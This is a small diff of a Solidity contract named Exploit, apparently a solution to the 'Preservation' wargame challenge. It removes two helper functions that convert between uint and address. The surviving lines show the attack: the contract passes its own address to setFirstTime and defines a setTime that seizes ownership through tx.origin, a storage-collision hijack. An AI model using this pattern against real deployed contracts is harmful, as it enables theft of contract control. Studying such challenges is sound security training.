@@ -18,14 +18,6 @@ contract Exploit {
         Preservation(_who).setFirstTime(uint(address(this)));
     }
 
-    function test(uint add) public pure returns (address) {
-       return address(add); 
-    }
-
-    function test2(address add) public pure returns (uint) {
-        return uint(add);
-    }
-
     function setTime(uint _time) public {
         owner = address(tx.origin);
     }
